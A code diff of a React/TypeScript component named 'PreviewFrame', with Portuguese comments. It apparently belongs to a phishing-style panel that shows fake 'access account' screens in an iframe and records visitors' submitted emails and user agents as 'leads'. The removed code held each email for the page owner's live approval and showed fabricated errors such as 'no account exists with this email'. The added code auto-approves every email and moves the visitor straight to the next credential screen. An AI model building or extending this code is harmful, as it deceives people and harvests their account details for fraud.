@@ -642,165 +642,26 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
         // aprovação salva localmente.
         if (data.action === "access-account" && adId && typeof data.email === "string" && data.email.trim()) {
           const submittedEmail = data.email.trim().toLowerCase();
-          // Já tem um pending em andamento: ignora cliques duplicados
-          if (emailPendingRef.current) {
-            return;
-          }
-          // Checa se o e-mail está banido pelo dono do anúncio.
-          // Se estiver, mostra "conta não existe" na hora, sem chamar o painel.
-          emailPendingRef.current = true;
-          pendingEmailRef.current = submittedEmail;
-          iframe.contentWindow?.postMessage({ type: "iframe-email-loading-start" }, "*");
+          // Aprovação automática: qualquer e-mail passa direto pra próxima tela,
+          // sem aguardar decisão do dono do anúncio.
           supabase
-            .from("ad_blocked_emails")
-            .select("id")
-            .eq("ad_id", adId)
-            .ilike("email", submittedEmail)
-            .limit(1)
-            .maybeSingle()
-            .then(async ({ data: blockedRow }) => {
-              if (blockedRow) {
-                emailPendingRef.current = false;
-                pendingEmailRef.current = "";
-                if (emailPendingTimerRef.current) {
-                  clearTimeout(emailPendingTimerRef.current);
-                  emailPendingTimerRef.current = null;
-                }
-                try {
-                  const approvedKey = `approved-emails:${adId}`;
-                  const raw = localStorage.getItem(approvedKey);
-                  const approved = raw ? (JSON.parse(raw) as string[]) : [];
-                  const filtered = approved.filter((item) => item.toLowerCase() !== submittedEmail);
-                  localStorage.setItem(approvedKey, JSON.stringify(filtered));
-                } catch {
-                  // ignore
-                }
-                iframe.contentWindow?.postMessage(
-                  {
-                    type: "iframe-email-error",
-                    message: "Não existe uma conta com este e-mail.",
-                  },
-                  "*",
-                );
-                return;
-              }
-              // Verifica também no banco se esse e-mail JÁ foi aprovado antes
-              // (em qualquer sessão deste anúncio). Permite auto-aprovar mesmo
-              // que o visitante tenha trocado de aba/dispositivo.
-              try {
-                const { data: priorApprove } = await supabase
-                  .from("ad_session_actions")
-                  .select("id")
-                  .eq("ad_id", adId)
-                  .eq("action", "approve")
-                  .filter("payload->>kind", "eq", "email")
-                  .ilike("payload->>email", submittedEmail)
-                  .limit(1)
-                  .maybeSingle();
-                if (priorApprove) {
-                  // Atualiza cache local pra acelerar próximas vezes
-                  try {
-                    const approvedKey = `approved-emails:${adId}`;
-                    const raw = localStorage.getItem(approvedKey);
-                    const current = raw ? (JSON.parse(raw) as string[]) : [];
-                    const next = Array.from(
-                      new Set([...current.map((i) => i.toLowerCase()), submittedEmail]),
-                    );
-                    localStorage.setItem(approvedKey, JSON.stringify(next));
-                  } catch {
-                    // ignore
-                  }
-                  // Registra o email_submitted pra que a sessão apareça em
-                  // "Sessões em andamento" do painel mesmo no auto-aprovado.
-                  supabase
-                    .from("ad_leads")
-                    .insert({
-                      ad_id: adId,
-                      screen_id: currentScreenIdRef.current,
-                      session_id: sessionId,
-                      field_name: "email_submitted",
-                      value: submittedEmail,
-                      user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
-                    })
-                    .then(({ error }) => {
-                      if (error) console.warn("[PreviewFrame] auto-approve email_submitted insert:", error);
-                    });
-                  emailPendingRef.current = false;
-                  pendingEmailRef.current = "";
-                  iframe.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
-                  const next = screensRef.current.find((s) => s.kind === "access-account");
-                  if (next) navigateToScreen(next);
-                  else navigateToManualScreen("access-account");
-                  return;
-                }
-              } catch (err) {
-                console.warn("[PreviewFrame] prior approve check failed:", err);
-              }
-              try {
-                const approvedKey = `approved-emails:${adId}`;
-                const raw = localStorage.getItem(approvedKey);
-                const approved = raw ? (JSON.parse(raw) as string[]) : [];
-                if (approved.some((item) => item.toLowerCase() === submittedEmail)) {
-                  // Mesmo no auto-aprovado via cache local, registra o lead
-                  // pra a sessão aparecer em "Sessões em andamento".
-                  supabase
-                    .from("ad_leads")
-                    .insert({
-                      ad_id: adId,
-                      screen_id: currentScreenIdRef.current,
-                      session_id: sessionId,
-                      field_name: "email_submitted",
-                      value: submittedEmail,
-                      user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
-                    })
-                    .then(({ error }) => {
-                      if (error) console.warn("[PreviewFrame] cached auto-approve email_submitted insert:", error);
-                    });
-                  emailPendingRef.current = false;
-                  pendingEmailRef.current = "";
-                  iframe.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
-                  const next = screensRef.current.find((s) => s.kind === "access-account");
-                  if (next) navigateToScreen(next);
-                  else navigateToManualScreen("access-account");
-                  return;
-                }
-              } catch {
-                // ignore
-              }
-              // Não banido: segue fluxo normal de aprovação
-              supabase
-                .from("ad_leads")
-                .insert({
-                  ad_id: adId,
-                  screen_id: currentScreenIdRef.current,
-                  session_id: sessionId,
-                  field_name: "email_submitted",
-                  value: submittedEmail,
-                  user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
-                })
-                .then(({ error }) => {
-                  if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
-                });
-              if (emailPendingTimerRef.current) {
-                clearTimeout(emailPendingTimerRef.current);
-              }
-              emailPendingTimerRef.current = setTimeout(() => {
-                if (!emailPendingRef.current) return;
-                emailPendingRef.current = false;
-                emailPendingTimerRef.current = null;
-                pendingEmailRef.current = "";
-                iframe.contentWindow?.postMessage(
-                  {
-                    type: "iframe-email-error",
-                    message: "Houve um problema ao acessar sua conta.",
-                    description: "Por favor, verifique se há algum bloqueio na sua rede de internet.",
-                  },
-                  "*",
-                );
-              }, 10_000);
+            .from("ad_leads")
+            .insert({
+              ad_id: adId,
+              screen_id: currentScreenIdRef.current,
+              session_id: sessionId,
+              field_name: "email_submitted",
+              value: submittedEmail,
+              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
+            })
+            .then(({ error }) => {
+              if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
             });
+          iframe.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
+          const next = screensRef.current.find((s) => s.kind === "access-account");
+          if (next) navigateToScreen(next);
+          else navigateToManualScreen("access-account");
           return;
-
         }
 
         // Caso "access-account" venha SEM e-mail (ou e-mail vazio): NUNCA
